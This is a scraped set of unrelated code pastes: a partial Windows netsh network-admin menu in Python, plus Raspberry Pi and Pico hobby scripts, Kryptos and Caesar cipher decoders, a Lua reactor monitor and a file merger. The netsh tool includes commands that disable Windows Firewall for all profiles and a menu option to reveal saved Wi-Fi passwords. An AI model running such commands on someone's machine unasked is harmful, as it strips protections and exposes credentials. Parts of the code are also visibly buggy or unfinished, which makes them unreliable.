    run_netsh_command(['netsh', 'advfirewall', 'firewall', 'add', 'rule', f'name=""{rule_name}""', f'protocol={protocol}', f'dir={direction}', f'localport={local_port}', 'action=allow'])

# OPTION 22
def add_primary_dns_server():
    interface_name_dns = input(""Enter the name of the network interface: "")
    dns_server_address = input(""Enter the Primary DNS Server address: "")
    run_netsh_command(['netsh', 'interface', 'ip', 'add', 'dns', f'name=""{interface_name_dns}""', f'addr={dns_server_address}'])

# OPTION 23
def allow_ping_requests():
    run_netsh_command(['netsh', 'advfirewall', 'firewall', 'add', 'rule', 'name=""All ICMP V4""', 'dir=in', 'action=allow', 'protocol=icmpv4'])

# OPTION 24
def block_ping_requests():
    run_netsh_command(['netsh', 'advfirewall', 'firewall', 'add', 'rule', 'name=""All ICMP V4""', 'dir=in', 'action=block', 'protocol=icmpv4'])

# OPTION 25
def disable_windows_firewall():
    run_netsh_command(['netsh', 'advfirewall', 'set', 'allprofiles', 'state', 'off'])

# OPTION 26
def reset_firewall_settings():
    run_netsh_command(['netsh', 'advfirewall', 'reset'])

# OPTION 27
def stop_network_trace():
    run_netsh_command(['netsh', 'trace', 'stop'])

# OPTION 28
def capture_packets():
    try:
        # Ask the user to choose the duration for the ping test
        print(""Choose the duration for the ping test:"")
        print(""1. Quick Ping Test (15 sec.)"")
        print(""2. Standard Ping Test (30 sec.)"")
        print(""3. Long Ping Test (60 sec.)"")

        choice = input(""Enter the option number: "")

        if choice == '1':
            duration_seconds = 15
        elif choice == '2':
            duration_seconds = 30
        elif choice == '3':
            duration_seconds = 60
        else:
            print(""Invalid choice. Defaulting to Standard Ping Test (30 sec.)"")
            duration_seconds = 30

        # Inform the user about the test
        print(f""Capturing packets for {duration_seconds} seconds. Please wait..."")

        # Run ping test (change 'example.com' to the desired target)
        result = subprocess.run(['ping', '-n', str(duration_seconds), 'example.com'], capture_output=True, text=True, check=True)

        # Display completion message
        print(""Packet capture completed."")

        # Save data
        save_option_data('Capture Packets', result.stdout)

    except subprocess.CalledProcessError as e:
        # Handle error if the command fails
        print(""Error:"", e.stderr)

# OPTION 29
def change_interface_ip_address():
    interface_name = input(""Enter the name of the network interface: "")
    ip_address = input(""Enter the new IP address: "")
    subnet_mask = input(""Enter the subnet mask: "")
    gateway = input(""Enter the gateway address: "")
    run_netsh_command(['netsh', 'int', 'ip', 'set', 'address', interface_name, 'static', ip_address, subnet_mask, gateway])



# OPTION 30
# PLACEHOLDER SCRIPT FOR NOW
def placeholder():
    print(""\nPLACEHOLDER\n"")
    
    

'''                ::IPV4::'''




# OPTION 31
def view_current_ipv4_configuration():
    print(""\n\t\t\t\t::IPV4::\n"")
    try:
        command = ['netsh', 'interface', 'ipv4', 'show', 'config']
        result = subprocess.run(command, capture_output=True, text=True, check=True)

        output = result.stdout.strip()
        if output:
            print(""\nCurrent IPv4 Configuration:"")
            print(output)
            save_option_data('View_Current_IPV4_Configuration', output)
        else:
            print(""No data found for IPv4 configuration."")

    except subprocess.CalledProcessError as e:
        print(""Error:"", e.stderr)




'''                ::IPV6::  [BROKEN]'''



# OPTION 32
def view_current_ipv6_configuration(interfaces):
    print(""\n\t\t\t\t::IPV6::\n"")
    
    if not interfaces:
        print(""No network interfaces available."")
        input(""\nPress Enter to continue..."")
        return

    selected_interface = get_interface_number(interfaces)
    if selected_interface is not None:
        try:
            # Display IPv6 information using the provided netsh commands
            run_netsh_command(['netsh', 'interface', 'ipv6', 'show', 'interfaces'], trace_file_path=None, max_size=None)
            run_netsh_command(['netsh', 'interface', 'ipv6', 'show', 'addresses'], trace_file_path=None, max_size=None)

        except subprocess.CalledProcessError as e:
            print(""Error displaying IPv6 configuration:"", e.stderr)




        
# OPTION 33 (EXIT)




'''                ::OPTIONS MENU::'''



def display_menu():
    options = [
        ""Display Firewall Settings"",
        ""Check Firewall Rules"",
        ""Check Network Interface Status"",
        ""Show Wi-Fi Network/Profiles & Passwords"",
        ""Get Current Wi-Fi Information"",
        ""Check all the Available Wireless Connections"",
        ""Check the State & Strength of all the Available Wireless Connections"",
        ""Disconnect from Currently Connected Wireless Device"",
        ""Connect to an Available Wireless Device"",
        ""Show all the Wireless Interfaces"",
        ""Show Drivers of Wireless Interfaces"",
        ""Check Current Proxy Setting in Windows"",
        ""Check TCP Global Parameters Status"",
        ""Check UDP Global Parameters Status"",
        ""Disable TCP RSS Global Parameter"",
        ""Enable TCP RSS Global Parameter"",
        ""List all the defined Aliases"",
        ""Reset Winsock entries to default"",
        ""Reset TCP/IP Stack to Installation Default"",
        ""Set Proxy in Windows using netsh command"",
        ""Show Multicast Joins for all Network Interfaces"",
        ""Allow a Port from Windows Firewall using netsh command"",
        ""Add a Primary DNS Server to an Interface"",
        ""Allow Ping requests through Windows Firewall"",
        ""Block Ping requests through Windows Firewall"",
        ""Disable Windows Firewall in all Profiles"",
        ""Reset Windows Firewall Settings to Default"",
        ""Stop Trace using netsh command"",
        ""[PING] Capture Packets using netsh command"",
        ""Change Interface IP Address"",
        ""--[PLACEHOLDER OPTION]--"",
        ""View Current IPV4 Configuration"",
        ""View Current IPV6 Configuration --[BROKEN]--"",
        ""Exit the program""
    ]

    for i, option in enumerate(options):
        print(f""{i}. {option}"")
        
        
        
        
'''                ::MAIN PROGRAM::'''


        
def main():
    interfaces = []  # Initialize an empty list of interfaces
    
    while True:
        display_menu()

        # Get user choice
        choice = input(""Enter the option number: "")

        if choice.isdigit() and 0 <= int(choice) <= 33:
            if choice == '0':
                last_command_output = display_firewall_settings()
                save_option_data('Display_firewall_settings', last_command_output)
            elif choice == '1':
                try:
                    result = subprocess.run(['netsh', 'advfirewall', 'firewall', 'show', 'rule', 'name=all'],
                                           capture_output=True, text=True, check=True)
                    last_command_output = result.stdout
                    if last_command_output:
                        print(""\nCurrent Firewall Rules for the Profile:"")
                        print(last_command_output)
                        save_option_data('Show_all_Firewall_rules_for_Current_Profile', last_command_output)
                    else:
                        print(""No firewall rules found."")
                except subprocess.CalledProcessError as e:
                    print(""Error:"", e.stderr)
            elif choice == '2':
                last_command_output = check_network_interface_status()
                save_option_data('Check Network Interface Status', last_command_output)
            elif choice == '3':
                last_command_output = view_current_ipv4_configuration()
                save_option_data('View_Current_IPV4_Configuration', last_command_output)
            elif choice == '4':
                last_command_output = get_current_wifi_info()
                save_option_data('Get Current Wi-Fi Information', last_command_output)
            elif choice == '5':
                last_command_output = check_available_wireless_connections()
                save_option_data('Check_Available_Wireless_Connections', last_command_output)
            elif choice == '6':
                last_command_output = check_wireless_interface_details()
                save_option_data('Check_Wireless_Interface_Details', last_command_output)
            elif choice == '7':    #Disconnect From Current Wi-Fi
                last_command_output = disconnect_wireless_device()
                save_option_data('Disconnect_from_Currently_Connected_Wireless_Device', last_command_output)
            elif choice == '8':    #Reconnect To Stored Wi-Fi Network
                wireless_networks_output = check_available_wireless_connections()
                networks = extract_available_wireless_networks(wireless_networks_output)
                selected_network = select_wifi_network(networks)
                if selected_network:
                    last_command_output = connect_to_wireless_device(selected_network)
            elif choice == '9':
                last_command_output = show_all_wireless_interfaces()
                save_option_data('Show_all_Wireless_Interfaces', last_command_output)
            elif choice == '10':
                last_command_output = show_wireless_drivers()
                save_option_data('Show_Wireless_Drivers', last_command_output)
            elif choice == '11':
                last_command_output = show_proxy_settings()
                save_option_data('Show_Current_Proxy_Setting_in_Windows', last_command_output)
            elif choice == '12':
                last_command_output = show_tcp_global_parameters()
                save_option_data('Check_TCP_Global_Parameters_Status', last_command_output)
            elif choice == '13':
                last_command_output = show_udp_global_parameters()
                save_option_data('Check_UDP_Global_Parameters_Status', last_command_output)
            elif choice == '14':
                last_command_output = disable_tcp_rss()
                save_option_data('Disable_TCP_RSS_Global_Parameter', last_command_output)
            elif choice == '15':
                last_command_output = enable_tcp_rss()
                save_option_data('Enable_TCP_RSS_Global_Parameter', last_command_output)
            elif choice == '16':
                last_command_output = list_defined_aliases()
                save_option_data('List_All_Defined_Aliases', last_command_output)
            elif choice == '17':
                last_command_output = reset_winsock_entries()
                save_option_data('Reset_Winsock_Entries_to_Default', last_command_output)
            elif choice == '18':
                last_command_output = reset_tcp_ip_stack()
                save_option_data('Reset_TCP_IP_Stack_to_Installation_Default', last_command_output)
            elif choice == '19':
                last_command_output = set_proxy()
                save_option_data('Set_Proxy_in_Windows_using_netsh_command', last_command_output)
            elif choice == '20':
                last_command_output = show_multicast_joins()
                save_option_data('Show_Multicast_Joins_for_All_Network_Interfaces', last_command_output)
            elif choice == '21':
                last_command_output = allow_port_firewall()
                save_option_data('Allow_a_Port_from_Windows_Firewall_using_netsh_command', last_command_output)
            elif choice == '22':
                last_command_output = add_primary_dns_server()
                save_option_data('Add_Primary_DNS_Server_to_an_Interface', last_command_output)
            elif choice == '23':
                last_command_output = allow_ping_requests()
                save_option_data('Allow_Ping_Requests_through_Windows_Firewall', last_command_output)
            elif choice == '24':
                last_command_output = block_ping_requests()
                save_option_data('Block_Ping_Requests_through_Windows_Firewall', last_command_output)
            elif choice == '25':
                last_command_output = disable_windows_firewall()
                save_option_data('Disable_Windows_Firewall_in_All_Profiles', last_command_output)
            elif choice == '26':
                last_command_output = reset_firewall_settings()
                save_option_data('Reset_Windows_Firewall_Settings_to_Default', last_command_output)
            elif choice == '27':
                last_command_output = stop_network_trace()
                save_option_data('Stop_Trace_using_netsh_command', last_command_output)
            elif choice == '28':
                last_command_output = capture_packets()
                save_option_data('[PING]Capture_Packets_using_netsh_command', last_command_output)
            elif choice == '29':
                last_command_output = change_interface_ip_address()
                save_option_data('Change_Interface_IP_Address', last_command_output)
            elif choice == '30':
                last_command_output = placeholder()
                save_option_data('PLACEHOLDER FOR OPTION', last_command_output)
            elif choice == '31':
                last_command_output = view_current_ipv4_configuration()
                save_option_data('View_Current_IPV4_Configuration', last_command_output)
            elif choice == '32':
                interfaces = display_network_interfaces()
                last_command_output = view_current_ipv6_configuration_wrapper(interfaces, display_list=False)
                save_option_data('View_Current_IPV6_Configuration', last_command_output)
            elif choice == '33': # [BROKEN]
                print(""Exiting the program. Goodbye!"")
                sys.exit(0)
            else:
                print(""\nInput Invalid!\n\tPlease enter a valid option number between 0 and 33.\n\t\tOr... type '34' to exit the program.\n"")
                input(""\nPress Enter to continue...\n"")
        else:
            print(""\nInput Invalid!\n\tPlease enter a valid option number between 0 and 33.\n\t\tOr... type '34' to exit the program\n"")
            input(""\nPress Enter to continue...\n"")

if __name__ == ""__main__"":
    main()






"
6CCwNsa8,sketchyEtchTesting.py,j0h,Python,Friday 1st of March 2024 07:56:47 PM CDT,"#!/usr/bin/python3
import RPi.GPIO as GPIO
import turtle
""""""
Ought to set up limits in screen size and x,y boundaries.
explore tracer function
""""""
# Setup GPIO
clearBtn = 12
liftBtn  = 16
ColorBtn = 20

# GPIO pins for the encoders
encoder1_pins = (24, 23)  # A and B pins for encoder 1 (x-axis)
encoder2_pins = (14, 15)  # A and B pins for encoder 2 (y-axis)

GPIO.setmode(GPIO.BCM)
GPIO.setup(clearBtn, GPIO.IN, pull_up_down=GPIO.PUD_UP)
GPIO.setup(liftBtn, GPIO.IN) #, pull_up_down=GPIO.PUD_UP #removal of this means you must hold the button down
GPIO.setup(ColorBtn, GPIO.IN, pull_up_down=GPIO.PUD_UP)
GPIO.setup(encoder1_pins[0], GPIO.IN) #removed PUD_UP as encoders are not PWM, and resistors are included.
GPIO.setup(encoder1_pins[1], GPIO.IN)
GPIO.setup(encoder2_pins[0], GPIO.IN)
GPIO.setup(encoder2_pins[1], GPIO.IN)

# Variables to store encoder state
encoder1_last_state = (GPIO.input(encoder1_pins[0]) << 1) | GPIO.input(encoder1_pins[1])
encoder2_last_state = (GPIO.input(encoder2_pins[0]) << 1) | GPIO.input(encoder2_pins[1])

# Encoder positions
x_coord  = 0
y_coord  = 0

penState = False  # False for pen down, True for pen up
i = 0             # index of current color

# Set up the turtle screen
screen = turtle.Screen()
screen.tracer(0)
screen.setup(width=1.0, height=1.0)  # Set the window to full-screen mode
canvas = screen.getcanvas()

# Create a RawTurtle object with the canvas
raw_turtle = turtle.RawTurtle(canvas)
raw_turtle.shape('circle')
raw_turtle.shapesize(0.5)  # Cursor size: 0.5 is half of normal
raw_turtle.width(6)        # Line width
raw_turtle.speed(0)

#BUTTON FUNCTIONS
    
#toggle though colors 
def Change_Color(channel):
    global i
    colors = [(1, 0, 0), (0, 1, 0), (0, 0, 1), (0, 1, 1), (1, 0, 1), (1, 1, 0), (1, 1, 1), (0, 0, 0)]  # List of RGB colors
    raw_turtle.pencolor(colors[i % len(colors)])  # Set pen color based on the current index of the length of the color list
    i += 1

def ClearScrnBtn(channel):
    global x_coord, y_coord #,oldX, oldY
    raw_turtle.reset()  # Reset the turtle, resets everything including point size
    raw_turtle.shapesize(0.5)  # Cursor size: 0.5 is half of normal
    raw_turtle.width(6)
    x_coord = 0
    y_coord = 0
    screen.tracer(0)

# Callback function to lift or lower the pen
def lift_pen(channel):
    global penState
    penState = not penState
    if penState:
        raw_turtle.penup()
    else:
        raw_turtle.pendown()


# Callback function for encoder 1 (x-axis)
def encoder1_callback(channel):
    global encoder1_last_state, x_coord
    a = GPIO.input(encoder1_pins[0])
    b = GPIO.input(encoder1_pins[1])
    new_state = (a << 1) | b
    if (encoder1_last_state == 0b00 and new_state == 0b10) or (encoder1_last_state == 0b11 and new_state == 0b01):
        x_coord += 6        
    elif (encoder1_last_state == 0b10 and new_state == 0b00) or (encoder1_last_state == 0b01 and new_state == 0b11):
        x_coord -= 6
    encoder1_last_state = new_state

# Callback function for encoder 2 (y-axis)
def encoder2_callback(channel):
    global encoder2_last_state, y_coord
    a = GPIO.input(encoder2_pins[0])
    b = GPIO.input(encoder2_pins[1])
    new_state = (a << 1) | b
    if (encoder2_last_state == 0b00 and new_state == 0b10) or (encoder2_last_state == 0b11 and new_state == 0b01):
        y_coord -= 6
    elif (encoder2_last_state == 0b10 and new_state == 0b00) or (encoder2_last_state == 0b01 and new_state == 0b11):
        y_coord += 6
    encoder2_last_state = new_state



# Add event detection for encoder 1 (x-axis)
GPIO.add_event_detect(encoder1_pins[0], GPIO.BOTH, callback=encoder1_callback,bouncetime=15)
GPIO.add_event_detect(encoder1_pins[1], GPIO.BOTH, callback=encoder1_callback,bouncetime=15)

# Add event detection for encoder 2 (y-axis)
GPIO.add_event_detect(encoder2_pins[0], GPIO.BOTH, callback=encoder2_callback,bouncetime=15)
GPIO.add_event_detect(encoder2_pins[1], GPIO.BOTH, callback=encoder2_callback,bouncetime=15)

# Add event listener to the button pins
GPIO.add_event_detect(clearBtn, GPIO.FALLING, callback=ClearScrnBtn, bouncetime=300)
GPIO.add_event_detect(liftBtn,  GPIO.FALLING, callback=lift_pen,     bouncetime=300)
GPIO.add_event_detect(ColorBtn, GPIO.FALLING, callback=Change_Color, bouncetime=300)

def update_position():
    global x_coord, y_coord 
    screen.title(f""X: {x_coord}, Y: {y_coord}"")
    #raw_turtle.goto(x_coord, y_coord)		
    raw_turtle.setx(x_coord)
    raw_turtle.sety(y_coord)

    if(GPIO.event_detected(encoder1_pins[0]) or GPIO.event_detected(encoder1_pins[1]) or GPIO.event_detected(encoder2_pins[0]) or GPIO.event_detected(encoder1_pins[1])):
        screen.ontimer(update_position, 100)
    else: 
        screen.ontimer(update_position, 100)

# Start updating the position
update_position()

# Start the turtle main loop
#turtle.mainloop()
screen.mainloop()

# Clean up GPIO on keyboard interrupt
GPIO.cleanup()
#turtle.done()   #not mentioned in turtle documentation for raw

"
0ADRqyHp,blink,Python253,Python,Friday 1st of March 2024 07:49:36 PM CDT,"#!/usr/bin/env python3
# Filename: blink.py
# Author: Jeoi Reqi
# Blinks the LED on a Raspberry Pi Pico Microcontroller running Adafruit Circuit Python & Digitalio

import board
import time
from digitalio import DigitalInOut, Direction, Pull

# Set up the onboard LED for output.
led = DigitalInOut(board.LED)
led.direction = Direction.OUTPUT

# Gather data on the voltage and brightness level of the LED.
def get_voltage_brightness(led_value):
    voltage = 3.3 * led_value
    brightness = 100 * led_value
    return voltage, brightness

# Main loop to switch the LED on or off based on the data gathered.
for i in range(3):
    led.value = True  # Turn on the LED
    voltage, brightness = get_voltage_brightness(led.value)
    print(""LED is on. Voltage: {}V, Brightness: {}%"".format(voltage, brightness))
    time.sleep(1)
    led.value = False  # Turn off the LED
    voltage, brightness = get_voltage_brightness(led.value)
    print(""LED is off. Voltage: {}V, Brightness: {}%"".format(voltage, brightness))
    time.sleep(1)
    if i == 2:
        break
print(""Done!"")
"
0StpzraW,dutycycle,Python253,Python,Friday 1st of March 2024 07:49:13 PM CDT,"#!/usr/bin/env python3
# Filename: dutycycle.py
# Author: Jeoi Reqi
# Pulse and Fade the LED on a Raspberry Pi Pico Microcontroller running Adafruit Circuit Python & Asyncio using Duty Cycle.

from time import sleep
from board import *
import pwmio
import asyncio
import microcontroller

led = pwmio.PWMOut(LED, frequency=5000, duty_cycle=0)

def led_pwm_up(led):
    for i in range(100):
        # PWM LED up and down
        if i < 50:
            led.duty_cycle = int(i * 2 * 65535 / 100)  # Up
        sleep(0.001)

def led_pwm_down(led):
    for i in range(101):
        # PWM LED up and down
        if i >= 50:
            led.duty_cycle = 65535 - int((i - 50) * 2 * 65535 / 100)  # Down
        sleep(0.002)

async def pulse_pico_led(led):
    print(""\n\t~Starting Duty Cycle Test With LED Pulse~\n"")
    led_state = True
    counter = 0
    result_count = 0
    while True:
        if led_state:
            print(""\n\n\tFading LED On:\n\n"")
            for i in range(101):
                brightness_pct = i
                duty_cycle = int(i * 65535 / 100)
                led.duty_cycle = duty_cycle
                await asyncio.sleep(0.025)
                print(""{:6d}"".format(led.duty_cycle), end="""")
                result_count += 1
                if result_count >= 12:
                    print(""\n"")
                    result_count = 0
            led_state = False
        else:
            print(""\n\n\n\tFading LED Off:\n\n"")
            for i in range(100, -1, -1):
                brightness_pct = i
                duty_cycle = int(i * 65535 / 100)
                led.duty_cycle = duty_cycle
                await asyncio.sleep(0.025)
                print(""{:6d}"".format(led.duty_cycle), end="""")
                result_count += 1
                if result_count >= 12:
                    print(""\n"")
                    result_count = 0
            led_state = True
        counter += 1
        if counter >= 2:
            print(""\n\n\t\t\t\t\t\t\t\t   Done!"")
            led.duty_cycle = 0
            break
        await asyncio.sleep(0)

asyncio.run(pulse_pico_led(led))

"
1VH1htet,kryptos_c2_decoder,Python253,Python,Friday 1st of March 2024 07:40:42 PM CDT,"#!/usr/bin/env python3
# Filename: kryptos_c2_decoder.py
# Author: Jeoi Reqi
# Decoder for The Kryptos Ciphers C2

# Function for the vigenere cryptography
def vigenere_decoder(ciphertext, key, alphabet):
    plaintext = ''
    key_index = 0
    for c in ciphertext:
        if c not in alphabet:
            plaintext += c
            continue
        shift = alphabet.index(key[key_index])
        ciphertext_index = alphabet.index(c)
        plaintext_index = (ciphertext_index - shift) % len(alphabet)
        plaintext += alphabet[plaintext_index]
        key_index = (key_index + 1) % len(key)
    return plaintext

ciphertext = ""VFPJUDEEHZWETZYVGWHKKQETGFQJNCEGGWHKKDQMCPFQZDQMMIAGPFXHQRLGTIMVMZJANQLVKQEDAGDVFRPJUNGEUNAQZGZLECGYUXUEENJTBJLBQCRTBJDFHRRYIZETKZEMVDUFKSJHKFWHKUWQLSZFTIHHDDDUVH?DWKBFUFPWNTDFIYCUQZEREEVLDKFEZMOQQJLTTUGSYQPFEUNLAVIDXFLGGTEZ?FKZBSFDQVGOGIPUFXHHDRKFFHQNTGPUAECNUVPDJMQCLQUMUNEDFQELZZVRRGKFFVOEEXBDMVPNFQXEZLGREDNQFMPNZGLFLPMRJQYALMGNUVPDXVKPDQUMEBEDMHDAFMJGZNUPLGEWJLLAETG""
key = ""ABSCISSA""
alphabet = ""KRYPTOSABCDEFGHIJLMNQUVWXZ""

plaintext = vigenere_decoder(ciphertext, key, alphabet)

# Print the decrypted plaintext
print(plaintext)

"
G3VSRucH,kryptos_c1_decoder,Python253,Python,Friday 1st of March 2024 07:40:14 PM CDT,"#!/usr/bin/env python3
# Filename: kryptos_c1_decoder.py
# Author: Jeoi Reqi
# Decoder for The Kryptos Ciphers C1

# Define the alphabet and key
ALPHABET = ""KRYPTOSABCDEFGHIJLMNQUVWXZ""
KEY = ""PALIMPSEST""


# Function for the vigenere cryptography
def vigenere_decoder(ciphertext, key, alphabet):
    """"""
    Decrypt a Vigenere cipher using the specified key and alphabet.

    Parameters:
    ciphertext (str): The text to decrypt.
    key (str): The key to use for decryption.
    alphabet (str): The alphabet to use for decryption.

    Returns:
    str: The decrypted plaintext.
    """"""
    # Convert the key and ciphertext to uppercase
    key = key.upper()
    ciphertext = ciphertext.upper()

    # Calculate the length of the key and ciphertext
    key_length = len(key)
    ciphertext_length = len(ciphertext)

    # Generate the repeated key
    repeated_key = """"
    for i in range(ciphertext_length):
        repeated_key += key[i % key_length]

    # Decrypt the ciphertext using the repeated key
    plaintext = """"
    for i in range(ciphertext_length):
        ciphertext_char = ciphertext[i]
        key_char = repeated_key[i]
        # Find the position of the key and ciphertext characters in the alphabet
        key_pos = alphabet.find(key_char)
        ciphertext_pos = alphabet.find(ciphertext_char)
        # Subtract the key position from the ciphertext position to get the plaintext position
        plaintext_pos = (ciphertext_pos - key_pos) % len(alphabet)
        # Get the plaintext character from the alphabet
        plaintext_char = alphabet[plaintext_pos]
        plaintext += plaintext_char

    return plaintext

# Decrypt the ciphertext using the given key and alphabet
ciphertext = ""EMUFPHZLRFAXYUSDJKZLDKRNSHGNFIVJYQTQUXQBQVYUVLLTREVJYQTMKYRDMFD""
key = ""PALIMPSEST""
alphabet = ""KRYPTOSABCDEFGHIJLMNQUVWXZ""
plaintext = vigenere_decoder(ciphertext, key, alphabet)

# Print the decrypted plaintext
print(plaintext)

"
zHRjWaR3,kryptos_c1_c2_decoder,Python253,Python,Friday 1st of March 2024 07:39:43 PM CDT,"#!/usr/bin/env python3
# Filename: kryptos_c1_c2_decoder.py
# Author: Jeoi Reqi
# Decoder for The Kryptos Ciphers C1 & C2


# Function for the vigenere cryptography
def vigenere_decoder(ciphertext, key, alphabet):
    """"""
    Decrypt a Vigenere cipher using the specified key and alphabet.

    Parameters:
    ciphertext (str): The text to decrypt.
    key (str): The key to use for decryption.
    alphabet (str): The alphabet to use for decryption.

    Returns:
    str: The decrypted plaintext.
    """"""
    plaintext = ''
    key_index = 0
    key_length = len(key)
    ciphertext_length = len(ciphertext)

    for i in range(ciphertext_length):
        if ciphertext[i] not in alphabet:
            plaintext += ciphertext[i]
            continue

        # Calculate the shift
        shift = alphabet.index(key[key_index])
        key_index = (key_index + 1) % key_length

        # Decrypt the character
        ciphertext_char = ciphertext[i]
        ciphertext_pos = alphabet.find(ciphertext_char)
        plaintext_pos = (ciphertext_pos - shift) % len(alphabet)
        plaintext += alphabet[plaintext_pos]

    return plaintext

# Test the combined function with the given ciphertexts and keys
ciphertext1 = ""EMUFPHZLRFAXYUSDJKZLDKRNSHGNFIVJYQTQUXQBQVYUVLLTREVJYQTMKYRDMFD""
key1 = ""PALIMPSEST""
alphabet1 = ""KRYPTOSABCDEFGHIJLMNQUVWXZ""
plaintext1 = vigenere_decoder(ciphertext1, key1, alphabet1)
print(""Cipher 1:"")
print(plaintext1)
print(""\n\n"")

ciphertext2 = ""VFPJUDEEHZWETZYVGWHKKQETGFQJNCEGGWHKKDQMCPFQZDQMMIAGPFXHQRLGTIMVMZJANQLVKQEDAGDVFRPJUNGEUNAQZGZLECGYUXUEENJTBJLBQCRTBJDFHRRYIZETKZEMVDUFKSJHKFWHKUWQLSZFTIHHDDDUVH?DWKBFUFPWNTDFIYCUQZEREEVLDKFEZMOQQJLTTUGSYQPFEUNLAVIDXFLGGTEZ?FKZBSFDQVGOGIPUFXHHDRKFFHQNTGPUAECNUVPDJMQCLQUMUNEDFQELZZVRRGKFFVOEEXBDMVPNFQXEZLGREDNQFMPNZGLFLPMRJQYALMGNUVPDXVKPDQUMEBEDMHDAFMJGZNUPLGEWJLLAETG""
key2 = ""ABSCISSA""
alphabet2 = ""KRYPTOSABCDEFGHIJLMNQUVWXZ""
plaintext2 = vigenere_decoder(ciphertext2, key2, alphabet2)
print(""Cipher 2:"")

# Print the decrypted plaintext
print(plaintext2)
print(""\n\n"")
"
sct6DaPG,hello_pico,Python253,Python,Friday 1st of March 2024 07:32:42 PM CDT,"#!/usr/bin/env python3
# Filename: hello_pico.py
# Author: Jeoi Reqi
# Simple Hello World Using The Pico Microcontroller & Ducky Script (Requirements are not met, you will need micro-python dependencies, packages, ducky scripts & a Pico)

import sys
import time

print(""\n"" * 100) # Clear the screen
print(""*"" * 40)
print(""*"" + "" "" * 38 + ""*"")
print(""*"" + "" "" * 14 + ""HELLO PICO!"" + "" "" * 13 + ""*"")
print(""*"" + "" "" * 38 + ""*"")
print(""*"" * 40 + ""\n\n"")

for i in range(6):
    time.sleep(1)
    print(""\n"")

print(""\n"" * 100) # Clear the screen
print(""Done!"")
sys.exit() # Terminate the script
"
cCvWYgXt,Untitled,darmod,Lua,Friday 1st of March 2024 07:29:04 PM CDT,"local basalt = require(""basalt"")
local monitor = peripheral.find(""monitor"")
local reactor = peripheral.find(""fissionReactorLogicAdapter"")

local r_coolant = reactor.getCoolantFilledPercentage()*100

--print(""r_status: "", r_status)

local monitorFrame = basalt.addMonitor()
:setMonitor(monitor)
:setBackground(colors.black)

local infoFrame = monitorFrame:addFrame()
:setSize(""{(parent.w / 2) - 2}"", ""{parent.h - 3}"")
:setPosition(2, 2)
:setBackground(colors.magenta)
:setBorder(colors.red)

local barsFrame = monitorFrame:addFrame()
:setSize(""{(parent.w / 2) - 2}"", ""{parent.h - 3}"")
:setPosition(""{(parent.w / 2) + 1}"", 2)
:setBackground(colors.yellow)
:setBorder(colors.orange)


local fuelBarFrame = barsFrame:addFrame()
:setSize(""{(parent.w - 1) - 2}"", ""{(parent.h / 5) - 2}"")
:setPosition(2, 2)

local fuelBar = fuelBarFrame:addProgressbar()
:setDirection(3)
:setPosition(1, 1)
:setSize(""{parent.w}"", ""{parent.h}"")
:setProgress(r_fuel)
:setProgressBar(colors.lime, "" "", colors.gray)

local fuelBarLabel = fuelBarFrame:addLabel()
:setText(""Fuel""..r_fuel)
:setTextAlign(""center"")
:setSize(""{parent.w}"", ""{parent.h}"")
:setForeground(colors.white)
--an attempt to force write over fuel bar
basalt.update(fuelBarLabel:setText(""Fuel""..r_fuel))

basalt.schedule(function()
  while true do -- we need a endless loop here
    updateReactor()
    sleep(1) -- every second
  end
end)()

basalt.autoUpdate()"
pzQiNVsM,circuit_caesar,Python253,Python,Friday 1st of March 2024 07:27:37 PM CDT,"#!/usr/bin/env python3
# Filename: circuit_caesar.py
# Author: Jeoi Reqi
# Circuit Python implementation of a Caesar cipher

SYM = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
MAX_KEY_SIZE = len(SYM)

def gMode():
    while True:
        print('Type ""e"" to encrypt or ""d"" to decrypt:')
        mode = input().lower()
        if mode in ['e', 'd']:
            return mode
        else:
            print('ERROR: Invalid mode')

def gMessage():
    print('Type a message:')
    return input()

def gKey():
    while True:
        print('Shift strength (1-%s):' % (MAX_KEY_SIZE))
        key = int(input())
        if 1 <= key <= MAX_KEY_SIZE:
            return key
        else:
            print('ERROR: Invalid key')

def gTranslated(mode, message, key):
    if mode == 'd':
        key = -key
    translated = ''
    for symbol in message:
        if symbol.isalpha():
            symbolIndex = SYM.find(symbol)
            if symbolIndex == -1:
                # Symbol not within MAX_KEY_SIZE parameters.
                translated += symbol
            else:
                # Encryption or Decryption Magic!
                symbolIndex += key
                if symbolIndex >= len(SYM):
                    symbolIndex -= len(SYM)
                elif symbolIndex < 0:
                    symbolIndex += len(SYM)
                translated += SYM[symbolIndex]
        else:
            # Non-letter character, just append to translated message.
            translated += symbol
    return translated

# Metadata
__file_name__ = 'circuit_caesar.py'
__author__ = 'Jeoi Reqi'
__copyright__ = 'Copyright 2018, Jeoi Reqi'
__credits__ = 'Jeoi Reqi'
__dct_url__ = 'http://purl.org/dc/terms/'
__license__ = 'Creative Commons'
__rel_url__ = 'http://creativecommons.org/licenses/by-nc/4.0/'
__version__ = 'CC-by-nc/4.0/'
__maintainer__ = 'Jeoi Reqi'
__email__ = 'jeoireqi@gmail.com'

print('\n::%s is licensed under the Creative Commons Attribution-NonCommercial 4.0 International License::\n\n'
      'File Name: %s\nAuthor: %s\nCopyright: %s\nCredits: %s\nDCT URL: %s\nLicense: %s\nRelease URL: %s\n'
      'Version: %s\nMaintainer: %s\nEmail: %s\n'
      % (__file_name__, __file_name__, __author__, __copyright__,
         __credits__, __dct_url__, __license__, __rel_url__, __version__,
         __maintainer__, __email__))

mode = gMode()
message = gMessage()
key = gKey()

print('\nTranslated:', gTranslated(mode, message, key), '\n')

"
m65840fZ,merge_files,Python253,Python,Friday 1st of March 2024 07:24:54 PM CDT,"#!/usr/bin/env python3
# Filename: merge_files.py
# Author: Jeoi Reqi
#
# This script meges all .txt files in a specified folder into a single saved file.

import os

# Function to gather and merge all files into one
def merge_files(input_folder, output_file):
    with open(output_file, 'w', encoding='utf-8') as output:
        for filename in os.listdir(input_folder):
            file_path = os.path.join(input_folder, filename)
            if os.path.isfile(file_path) and filename.endswith('.txt'):
                with open(file_path, 'r', encoding='utf-8') as file:
                    output.write(file.read())
                    output.write('\n')  # Add a newline after each file if needed

if __name__ == ""__main__"":
    input_folder_path = r'~\I-SOON\InitialTranslations\LG-TRANS1\TXT\en\Translate\translated_data'  # Replace with the folder containing the .txt files
    output_file_path = r'~\I-SOON\InitialTranslations\LG-TRANS1\TXT\en\Translate\merged_output.txt'  # Replace with the desired output file name

    merge_files(input_folder_path, output_file_path)  # Merge the files into a single custom named file

    print(""Files merged successfully."")  # Terminal output

"
